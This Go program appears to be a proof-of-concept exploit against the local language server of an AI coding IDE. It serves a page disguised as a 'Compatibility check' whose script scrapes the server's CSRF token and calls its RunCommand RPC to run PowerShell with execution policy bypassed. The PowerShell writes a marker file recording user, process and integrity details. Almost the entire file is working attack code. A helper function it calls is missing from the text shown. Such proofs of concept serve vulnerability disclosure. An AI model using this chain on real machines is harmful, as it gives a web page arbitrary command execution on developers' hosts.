package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	runCommandPath = "/exa.language_server_pb.LanguageServerService/RunCommand"
	markerName     = "antigravity-browser-runcommand-host-proof.txt"
	proofLabel     = "ANTIGRAVITY_BROWSER_RUNCOMMAND_HOST_PROOF"
)

// The page deliberately has one privileged RPC: RunCommand.  It discovers the
// CSRF value from the language-server root instead of accepting an injected
// token, and reports only stage/status values to its local launcher.
const pageTemplate = `<!doctype html>
<meta charset="utf-8"><title>Compatibility check</title>
<script>
(async () => {
  const candidates = {{.Candidates}};
  const callback = {{.Callback}};
  const payload = {{.Payload}};
  const rpcPath = {{.RPCPath}};
  function csrfFromRoot(text) {
    const m = text.match(/"csrfToken"\s*:\s*"((?:\\.|[^"\\])*)"/i);
    if (!m) return "";
    try { return JSON.parse('"' + m[1] + '"'); } catch (_) { return ""; }
  }
  async function report(stage, status) {
    try {
      await fetch(callback + "/event", {method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify({stage, status: String(status)})});
    } catch (_) {}
  }
  for (const base of candidates) {
    let root;
    try {
      root = await fetch(base + "/", {mode:"cors", credentials:"include", cache:"no-store"});
      await report("root", root.status);
    } catch (_) { await report("root", "network-error"); continue; }
    if (!root.ok) continue;
    const csrf = csrfFromRoot(await root.text());
    if (!csrf) { await report("runcommand", "csrf-missing"); continue; }
    try {
      const reply = await fetch(base + rpcPath, {method:"POST", mode:"cors", credentials:"include",
        headers:{"Content-Type":"application/json", "Connect-Protocol-Version":"1", "X-Codeium-Csrf-Token":csrf},
        body: JSON.stringify(payload)});
      await reply.text();
      await report("runcommand", reply.status);
      if (reply.ok) return;
    } catch (_) { await report("runcommand", "network-error"); }
  }
})();
</script>`

type candidate struct {
	Base   string `json:"-"`
	Source string `json:"-"`
}

type runCommandRequest struct {
	Command   string   `json:"command"`
	Args      []string `json:"args"`
	Cwd       string   `json:"cwd"`
	TimeoutMS int64    `json:"timeoutMs"`
}

type pageData struct {
	Candidates template.JS
	Callback   template.JS
	Payload    template.JS
	RPCPath    template.JS
}

type recorder struct {
	mu sync.Mutex
	f  *os.File
}

func (r *recorder) line(format string, args ...any) {
	r.mu.Lock()
	defer r.mu.Unlock()
	fmt.Fprintf(r.f, time.Now().UTC().Format(time.RFC3339Nano)+" "+format+"\r\n", args...)
	_ = r.f.Sync()
}

func addressShape(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "scheme=absent host=absent port=absent"
	}
	parseValue := raw
	if !strings.Contains(raw, "://") {
		parseValue = "http://" + raw
	}
	u, err := url.Parse(parseValue)
	if err != nil {
		return "scheme=invalid host=invalid port=unknown"
	}
	host := "other"
	switch strings.ToLower(u.Hostname()) {
	case "127.0.0.1", "::1":
		host = "loopback"
	case "localhost":
		host = "localhost"
	}
	port := "default"
	if u.Port() != "" {
		port = "explicit"
	}
	return fmt.Sprintf("scheme=%s host=%s port=%s", u.Scheme, host, port)
}

func languageServerCandidates(raw string, rec *recorder) []candidate {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		rec.line("ADDRESS source=environment present=false")
		return nil
	}
	rec.line("ADDRESS source=environment present=true shape=%s", addressShape(raw))
	if strings.Contains(raw, "://") {
		return []candidate{{Base: strings.TrimRight(raw, "/"), Source: "environment"}}
	}
	return []candidate{{Base: "http://" + raw, Source: "environment"}, {Base: "https://" + raw, Source: "environment"}}
}

func proofPayload() runCommandRequest {
	// The marker is the sole fixed path element.  The host-side result contains
	// identity evidence without depending on a user name or a language-server port.
	script := "$p=Join-Path $env:USERPROFILE '" + markerName + "';" +
		"$me=Get-CimInstance Win32_Process -Filter ('ProcessId='+$PID) -ErrorAction SilentlyContinue;" +
		"$ppid=if($me){$me.ParentProcessId}else{0};" +
		"$parent=if($ppid){(Get-CimInstance Win32_Process -Filter ('ProcessId='+$ppid) -ErrorAction SilentlyContinue).Name}else{'unknown'};" +
		"if([string]::IsNullOrWhiteSpace($parent)){$parent='unknown'};" +
		"$il=(whoami.exe /groups | Select-String -SimpleMatch 'Mandatory Label' | Select-Object -First 1).Line;" +
		"if([string]::IsNullOrWhiteSpace($il)){$il='unavailable'}else{$il=$il.Trim()};" +
		"[IO.File]::WriteAllLines($p,@('" + proofLabel + "','PID='+$PID,'PPID='+$ppid,'PARENT='+$parent,'USER='+[Environment]::UserName,'INTEGRITY='+$il));"
	return runCommandRequest{
		Command: "powershell.exe",
		Args:    []string{"-NoLogo", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script},
		Cwd:     ".", TimeoutMS: 10000,
	}
}

func candidateBases(candidates []candidate) []string {
	result := make([]string, 0, len(candidates))
	for _, c := range candidates {
		result = append(result, c.Base)
	}
	return result
}

func runLauncher(callback string) string {
	// The launcher only opens the ephemeral local page.  Status is normalized so
	// logs do not capture output, ports, tokens, page contents, or command bodies.
	script := "Add-Type -AssemblyName System.Runtime.WindowsRuntime;[Windows.System.Launcher,Windows.System,ContentType=WindowsRuntime]|Out-Null;$o=[Windows.System.Launcher]::LaunchUriAsync([Uri]'" + callback + "/');Start-Sleep -Seconds 2;if($o.Status -eq 'Completed'){exit 0}else{exit 1}"
	cmd := exec.Command("powershell.exe", "-NoLogo", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script)
	if err := cmd.Run(); err != nil {
		return "error"
	}
	return "completed"
}

func main() {
	exe, _ := os.Executable()
	logFile, err := os.OpenFile(filepath.Join(filepath.Dir(exe), "runcommand-browser.log"), os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return
	}
	defer logFile.Close()
	rec := &recorder{f: logFile}

	listener, err := net.Listen("tcp4", "127.0.0.1:0")
	if err != nil {
		rec.line("LAUNCH status=listener-error")
		return
	}
	defer listener.Close()
	callback := "http://" + listener.Addr().String()

	candidates := languageServerCandidates(os.Getenv("ANTIGRAVITY_LS_ADDRESS"), rec)
	if len(candidates) == 0 {
		candidates = fallbackLanguageServerCandidates(rec)
	}
	for _, c := range candidates {
		rec.line("ADDRESS source=%s shape=%s", c.Source, addressShape(c.Base))
	}
	if len(candidates) == 0 {
		rec.line("LAUNCH status=no-candidate")
		return
	}

	bases, _ := json.Marshal(candidateBases(candidates))
	payload, _ := json.Marshal(proofPayload())
	callbackJSON, _ := json.Marshal(callback)
	rpcJSON, _ := json.Marshal(runCommandPath)
	page := template.Must(template.New("page").Parse(pageTemplate))
	mux := http.NewServeMux()
	mux.HandleFunc("/event", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			w.WriteHeader(http.StatusMethodNotAllowed)
			return
		}
		var event struct {
			Stage  string `json:"stage"`
			Status string `json:"status"`
		}
		if json.NewDecoder(http.MaxBytesReader(w, r.Body, 512)).Decode(&event) != nil || (event.Stage != "root" && event.Stage != "runcommand") {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		status := strings.Map(func(ch rune) rune {
			if (ch >= '0' && ch <= '9') || ch == '-' {
				return ch
			}
			return -1
		}, event.Status)
		if status == "" {
			status = "invalid"
		}
		if event.Stage == "root" {
			rec.line("ROOT status=%s", status)
		} else {
			rec.line("RUNCOMMAND status=%s", status)
		}
		w.WriteHeader(http.StatusNoContent)
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		_ = page.Execute(w, pageData{Candidates: template.JS(bases), Callback: template.JS(callbackJSON), Payload: template.JS(payload), RPCPath: template.JS(rpcJSON)})
	})
	server := &http.Server{Handler: mux, ReadHeaderTimeout: 5 * time.Second}
	go server.Serve(listener)
	rec.line("LAUNCH status=%s", runLauncher(callback))
	time.Sleep(5 * time.Second)
	_ = server.Close()
}
